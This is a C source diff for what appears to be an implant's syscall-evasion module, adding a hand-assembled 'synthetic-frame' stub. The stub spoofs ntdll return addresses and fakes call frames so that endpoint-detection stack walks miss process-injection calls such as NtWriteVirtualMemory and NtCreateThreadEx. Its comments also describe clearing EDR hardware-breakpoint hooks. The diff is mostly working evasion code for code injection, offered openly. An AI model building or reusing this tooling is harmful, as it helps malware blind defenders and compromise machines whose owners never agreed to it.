@@ -8,8 +8,35 @@
  *
  * Indirect stub v2 plants an ntdll `ret` under the syscall gadget, so the
  * stack frame directly beneath the kernel-visible syscall frame is an
- * ntdll address instead of this unbacked stub page (the deeper beacon
- * frame needs synthetic frames - Phase 2 follow-up).
+ * ntdll address instead of this unbacked stub page. v2 only works for
+ * <=4-arity syscalls (no stack arguments): pushing a fake return address
+ * shifts [rsp+8..] under the kernel's nose.
+ *
+ * Synthetic-frame stub v3 (round 26) closes the >4-arity gap - the whole
+ * point of the gate: NtWriteVirtualMemory / NtAllocateVirtualMemory /
+ * NtCreateThreadEx are the injection-family calls an ETWti stack walk
+ * stares at, and they all take stack arguments.
+ *
+ * v3 builds a synthetic frame area below the real frame and pivots onto it:
+ *
+ *   push rbp / mov rbp, rsp        rbp = real-stack anchor (the kernel
+ *                                  preserves non-volatile registers across
+ *                                  the syscall, and so does the bare
+ *                                  syscall;ret gadget)
+ *   sub  rsp, SYNTH                [rsp+0]    = ntdll leave;ret (C9 C3)
+ *                                  [rsp+8..]  = args 5..N copied in place
+ *                                  [.. +8*N]  = fake ntdll frame chain
+ *                                  (never executed - walk cosmetics only)
+ *   mov r10,rcx / mov eax,SSN / jmp [rip+0] -> ntdll syscall;ret
+ *
+ * At the syscall the kernel reads its stack arguments from [rsp+8..] (the
+ * exact slots v2's push used to shift), the walk-visible return address is
+ * ntdll, and the return path needs NO stack qwords: syscall ret ->
+ * leave;ret -> rsp=rbx.. rsp=rbp anchor, pop rbp restores the caller's rbp,
+ * ret lands on the wrapper's real return address with rax = NTSTATUS.
+ * A ret-chain cannot do this for stack-argument syscalls (it would pop
+ * arg5 as a return target) - the register-anchored leave pivot is the
+ * synthetic-frames form (Ghost Frames / LACUNA direction).
  *
  * DR check: EDR hardware-breakpoint hooks (Cymulate Blindside lineage)
  * live in DR0-3; the gate samples and clears them on resolve and every
@@ -34,9 +61,13 @@ typedef struct {
 	BYTE * gadget; /* ntdll syscall;ret */
 	BYTE * stub;   /* VirtualAlloc'd page; RW except while rewritten */
 	BOOL  ready;
-	BYTE  arity;   /* NT parameter count: >4 means stack args, where the
-	                * v2 push would shift them under the kernel's nose */
+	BYTE  arity;   /* NT parameter count: >4 means stack arguments, which the
+	                * v2 push shifts under the kernel (v3 handles them) */
 } sc_entry;
+
+/* ntdll `leave; ret` (C9 C3) - the v3 return-path pivot. NULL = v3
+ * unavailable, make_exec falls back to v2 (<=4) / direct (>4). */
+static BYTE * g_leave_gadget;
 
 /* the resolved syscall set (section 13.2): injection / memory / token /
  * wait / file families. Wrappers exist for the hot injection paths; the
@@ -139,6 +170,138 @@ static void build_direct_stub(BYTE * dst, DWORD ssn) {
 	dst[10] = 0xC3;
 }
 
+/* ---- v3 synthetic-frame machinery (round 26) ----
+ *
+ * find_leave_gadget walks ntdll's first executable section for a C9 C3
+ * (leave; ret) pair. Section-aware on purpose: a hit in .data would be a
+ * DEP fault the moment the syscall returns into it. */
+static BYTE * find_leave_gadget(HMODULE m) {
+	IMAGE_DOS_HEADER * dos;
+	IMAGE_NT_HEADERS * nt;
+	IMAGE_SECTION_HEADER * sec;
+	int i;
+	BYTE * hit;
+
+	if (m == NULL)
+		return NULL;
+	dos = (IMAGE_DOS_HEADER *)m;
+	if (dos->e_magic != 0x5A4D)
+		return NULL;
+	nt = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
+	if (nt->Signature != 0x00004550)
+		return NULL;
+	sec = (IMAGE_SECTION_HEADER *)((BYTE *)&nt->OptionalHeader + nt->FileHeader.SizeOfOptionalHeader);
+	for (i = 0; i < nt->FileHeader.NumberOfSections; i++) {
+		DWORD chars = sec[i].Characteristics;
+		if (!(chars & 0x20000000) || !(chars & 0x40000000)) /* EXECUTE|READ */
+			continue;
+		/* the section is mapped whole (SizeOfRawData rounded up); scan the
+		 * smaller of raw/virtual so we never touch a guard tail */
+		DWORD span = sec[i].SizeOfRawData < sec[i].Misc.VirtualSize ? sec[i].SizeOfRawData : sec[i].Misc.VirtualSize;
+		BYTE * base = (BYTE *)m + sec[i].VirtualAddress;
+		for (hit = base; hit < base + span - 1; hit++) {
+			if (hit[0] == 0xC9 && hit[1] == 0xC3)
+				return hit;
+		}
+	}
+	return NULL;
+}
+
+/* Emit helpers for the hand-assembled v3 stub (x64). disp8 addressing only:
+ * max offset touched is RA1(0) + args(<=7*8) + fakes(4*8) < 0x80. */
+
+static int emit_imm64_reg(BYTE * p, unsigned long long v) {
+	/* mov rax, imm64 */
+	p[0] = 0x48; p[1] = 0xB8;
+	memcpy(p + 2, &v, 8);
+	return 10;
+}
+
+static int emit_store_rax_rsp(BYTE * p, int disp) {
+	/* mov [rsp+disp8], rax */
+	p[0] = 0x48; p[1] = 0x89; p[2] = 0x44; p[3] = 0x24; p[4] = (BYTE)disp;
+	return 5;
+}
+
+static int emit_load_rax_rbp(BYTE * p, int disp) {
+	/* mov rax, [rbp+disp8] */
+	p[0] = 0x48; p[1] = 0x8B; p[2] = 0x45; p[3] = (BYTE)disp;
+	return 4;
+}
+
+/* build_synth_stub: the v3 synthetic-frame stub for ANY arity.
+ *
+ * synth layout (rsp at the syscall):
+ *   +0x00        RA1  = ntdll leave;ret   (walk-visible return address)
+ *   +0x08..0x20  shadow space             (the 32-byte home the ABI puts
+ *                                          between the return address and
+ *                                          the stack args)
+ *   +0x28..      args 5..N                (the kernel's stack-arg window:
+ *                                          arg5 sits at return-address+0x28,
+ *                                          exactly where a C caller places
+ *                                          it for the live-proven direct
+ *                                          stub - NOT at +0x08)
+ *   +A           fake frame chain         (4 in-module RAs, walk cosmetics,
+ *                                          never executed)
+ * SYNTH = 0x28 + 8*S + 32; A = 0x28 + 8*S. */
+static int build_synth_stub(BYTE * dst, sc_entry * e) {
+	int s = e->arity > 4 ? e->arity - 4 : 0; /* stack-arg count */
+	int synth = 0x28 + 8 * s + 32;
+	int a_off = 0x28 + 8 * s;
+	int n = 0, k;
+	unsigned long long r;
+
+	if (s > 7)
+		return 0; /* longest NT signature we carry is 11 params */
+
+	/* push rbp; mov rbp, rsp; sub rsp, imm32 */
+	dst[n++] = 0x55;
+	dst[n++] = 0x48; dst[n++] = 0x89; dst[n++] = 0xE5;
+	dst[n++] = 0x48; dst[n++] = 0x81; dst[n++] = 0xEC;
+	memcpy(dst + n, &synth, 4); /* imm32 (values stay small - positive dwords) */
+	n += 4;
+
+	/* [rsp] = RA1 (ntdll leave;ret) */
+	n += emit_imm64_reg(dst + n, (unsigned long long)g_leave_gadget);
+	n += emit_store_rax_rsp(dst + n, 0);
+
+	/* copy args 5..N from the real frame ([rbp+0x30+8k]: entry rsp+0x28
+	 * under the pushed rbp) into the synth frame ([rsp+0x28+8k]) - the
+	 * kernel's stack-argument window */
+	for (k = 0; k < s; k++) {
+		n += emit_load_rax_rbp(dst + n, 0x30 + 8 * k);
+		n += emit_store_rax_rsp(dst + n, 0x28 + 8 * k);
+	}
+
+	/* fake frame chain above the args: alternating in-module gadgets. The
+	 * walk sees ntdll addresses here; execution never reaches them (RA1's
+	 * leave pivots straight back to the real anchor). */
+	{
+		unsigned long long fakes[4];
+		fakes[0] = (unsigned long long)g_leave_gadget;
+		fakes[1] = (unsigned long long)e->gadget;        /* syscall;ret */
+		fakes[2] = (unsigned long long)g_leave_gadget;
+		fakes[3] = (unsigned long long)e->gadget;
+		for (k = 0; k < 4; k++) {
+			n += emit_imm64_reg(dst + n, fakes[k]);
+			n += emit_store_rax_rsp(dst + n, a_off + 8 * k);
+		}
+	}
+
+	/* mov r10, rcx; mov eax, SSN (AFTER every rax imm64 load - the 64-bit
+	 * load zeroes eax; shipping SSN first sent a garbage number, the old
+	 * v2 byte-order trap); jmp [rip+0] -> ntdll syscall;ret */
+	dst[n++] = 0x4C; dst[n++] = 0x8B; dst[n++] = 0xD1;
+	dst[n++] = 0xB8;
+	memcpy(dst + n, &e->ssn, 4);
+	n += 4;
+	dst[n++] = 0xFF; dst[n++] = 0x25; dst[n++] = 0x00; dst[n++] = 0x00; dst[n++] = 0x00; dst[n++] = 0x00;
+	r = (unsigned long long)e->gadget;
+	memcpy(dst + n, &r, 8);
+	n += 8;
+	return n;
+}
+
 /* ---- DR sampling / clearing (hardware-breakpoint hook defense) ---- */
 
 static void gate_dr_check(void) {
@@ -174,12 +337,13 @@ void syscalls_test_indirect_mode(int on)
 
 static void * make_exec(sc_entry * e, int indirect) {
 	DWORD old = 0;
-	BYTE built[48]; /* v2 indirect stub is 33 bytes - keep headroom so the
-	                 * gadget qword never writes past the buffer (the first
-	                 * cut overflowed built[32] by one byte and fail-fasted
-	                 * the /GS cookie on CI) */
+	BYTE built[256]; /* v3 synth stub is ~112+9S bytes (max arity 11 -> ~175);
+	                  * v2 is 33. The first cut overflowed a 32-byte buffer
+	                  * by one byte and fail-fasted the /GS cookie on CI -
+	                  * keep generous headroom */
 	BYTE * p;
-	SIZE_T stub_size = 64;
+	SIZE_T stub_size = 256;
+	int form;
 
 	if (!e->ready)
 		return NULL;
@@ -201,23 +365,24 @@ static void * make_exec(sc_entry * e, int indirect) {
 	p = e->stub;
 
 	memset(built, 0, sizeof(built));
-	/* Un-shelved (round 20): the "environmental" m=2 crashes were the
-	 * arity-0 bug above - the v2 push encoding ran for stack-argument
-	 * syscalls and shifted [rsp+8..] under the kernel. With arity parsed
-	 * correctly: method 2 = v2 RA chain (ntdll ret planted under the
-	 * syscall gadget) for <=4-arity syscalls, direct stub for the rest. */
+	/* Stub form selection (round 26):
+	 *   v3 synthetic frames - any arity, needs syscall;ret + leave;ret
+	 *   v2 RA chain         - <=4 arity fallback (no stack args to shift)
+	 *   direct              - no verified gadgets
+	 * v3 exists because the injection-family heavyweights (write/read/
+	 * alloc/protect/dup/threadex) all take stack arguments: a ret-chain
+	 * would pop arg5 as a return target, so their RA spoof needs the
+	 * rbp-anchored leave pivot (see build_synth_stub). */
 	indirect = indirect && (e->gadget != NULL); /* unverified gadget: plain direct */
 	(void)sc_force_indirect;
-	if (indirect && e->arity > 4) {
-		/* stack-argument syscalls: the v2 push would shift [rsp+8..]
-		 * under the kernel's nose, and the plain jmp-to-ntll-syscall
-		 * gadget proved unstable on some builds (live CI: AV at the
-		 * first NtAllocateVirtualMemory with a verified 0F 05 C3
-		 * gadget) - serve them through the proven direct stub. Full
-		 * RA spoof for these needs synthetic frames (13.2). */
-		build_direct_stub(built, e->ssn);
+	form = 0;
+	if (indirect && g_leave_gadget != NULL && e->arity <= 11) {
+		if (build_synth_stub(built, e) > 0)
+			form = 3;
 	}
-	else if (indirect && e->gadget) {
+	if (form == 0 && indirect && e->arity <= 4)
+		form = 2;
+	if (form == 2) {
 		/* v2 RA spoof (byte order matters!):
 		 *   mov r10, rcx
 		 *   mov rax, gadget+2 ; push rax     <- bare `ret` inside ntdll
@@ -242,7 +407,7 @@ static void * make_exec(sc_entry * e, int indirect) {
 		built[19] = 0xFF; built[20] = 0x25; /* jmp qword ptr [rip+0] */
 		memcpy(built + 25, &e->gadget, 8); /* bytes 25..32: 33-byte stub */
 	}
-	else {
+	else if (form != 3) {
 		build_direct_stub(built, e->ssn);
 	}
 
@@ -260,6 +425,7 @@ void syscalls_resolve(void) {
 
 	if (ntdll == NULL)
 		return;
+	g_leave_gadget = find_leave_gadget(ntdll);
 #define SC_PARSE(id, name, ar) do { \
 		BYTE * fn = (BYTE *)GetProcAddress(ntdll, name); \
 		sc_##id.ready = (fn != NULL) && parse_nt_stub(fn, &sc_##id); \
@@ -287,6 +453,41 @@ void * syscalls_test_gadget(const char * name)
 	if (strcmp(name, "NtFreeVirtualMemory") == 0)
 		return sc_free.gadget;
 	return NULL;
+}
+
+void * syscalls_test_leave_gadget(void);
+void * syscalls_test_leave_gadget(void)
+{
+	return g_leave_gadget;
+}
+
+/* which stub form make_exec serves for the named entry right now:
+ * "synth" (v3) / "v2" / "direct" - CI prints this so the log proves the
+ * synthetic-frame path engaged, not silently fell back */
+const char * syscalls_test_form(const char * name);
+
+const char * syscalls_test_form(const char * name)
+{
+	sc_entry * e = NULL;
+	if (name == NULL)
+		return "none";
+	if (strcmp(name, "NtAllocateVirtualMemory") == 0)
+		e = &sc_alloc;
+	else if (strcmp(name, "NtWriteVirtualMemory") == 0)
+		e = &sc_write;
+	else if (strcmp(name, "NtCreateThreadEx") == 0)
+		e = &sc_thrdex;
+	else if (strcmp(name, "NtFreeVirtualMemory") == 0)
+		e = &sc_free;
+	if (e == NULL || !e->ready)
+		return "none";
+	if (e->gadget == NULL)
+		return "direct";
+	if (g_leave_gadget != NULL && e->arity <= 11)
+		return "synth";
+	if (e->arity <= 4)
+		return "v2";
+	return "direct";
 }
 
 int syscalls_gate_ready_count(void) {
